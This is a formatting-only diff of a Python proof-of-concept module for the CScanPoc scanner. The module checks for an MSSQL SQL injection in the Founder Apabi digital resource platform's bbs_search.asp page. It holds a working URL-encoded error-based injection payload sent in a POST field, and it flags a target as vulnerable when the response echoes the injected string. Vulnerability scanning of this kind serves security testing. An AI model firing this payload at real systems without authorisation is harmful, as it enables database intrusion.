@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Founder_0003' # 平台漏洞编号，留空
+    vuln_id = 'Founder_0003'  # 平台漏洞编号，留空
     name = '方正Apabi数字资源平台MSSQL SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-03-26'  # 漏洞公布时间
     desc = '''
         方正Apabi数字资源平台 /dlib/bbs/bbs_search.asp?lang=gb 存在MSSQL SQL注射漏洞。
@@ -31,12 +32,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
-            #No.2 http://www.wooyun.org/bugs/wooyun-2010-0103581
+            # No.2 http://www.wooyun.org/bugs/wooyun-2010-0103581
             payload = "/dlib/bbs/bbs_search.asp?lang=gb"
             post = "key=1%27%29%20and%201%3Dconvert%28int%2C%27hen%27%2b%27tai%27%29%20and%20%28%271%27%20like%20%271"
-            code, head, body, errcode1, final_url = hh.http(self.target + payload, post=post)
+            code, head, body, errcode1, final_url = hh.http(
+                self.target + payload, post=post)
             if 'hentai' in body:
                 #security_hole(arg+payload+" && post:"+post)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
